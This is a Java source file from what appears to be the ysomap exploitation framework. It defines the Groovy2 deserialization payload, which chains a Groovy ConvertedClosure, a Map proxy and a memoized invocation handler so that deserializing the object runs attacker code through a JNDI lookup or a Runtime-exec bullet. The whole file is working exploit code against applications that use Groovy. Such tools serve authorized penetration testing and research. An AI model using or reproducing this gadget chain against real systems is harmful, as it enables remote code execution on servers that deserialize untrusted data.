package ysomap.payloads.java.groovy;

import groovy.lang.Closure;
import org.codehaus.groovy.runtime.ConvertedClosure;
import ysomap.bullets.Bullet;
import ysomap.bullets.groovy.ClosureWithJNDIBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

import java.lang.reflect.Proxy;
import java.util.Map;

/**
 * @author wh1t3p1g
 * @since 2021/8/6
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.FROHOFF })
@Targets({Targets.JDK})
@Require(bullets = {"ClosureWithJNDIBullet", "ClosureWithRuntime2Bullet"},param = false)
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
public class Groovy2 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ClosureWithJNDIBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        ConvertedClosure closure = new ConvertedClosure((Closure) obj, "entrySet");
        Map map = (Map) Proxy.newProxyInstance(
                Groovy2.class.getClassLoader(),
                new Class<?>[]{Map.class}, closure);

        return PayloadHelper.createMemoizedInvocationHandler(map);
    }
}
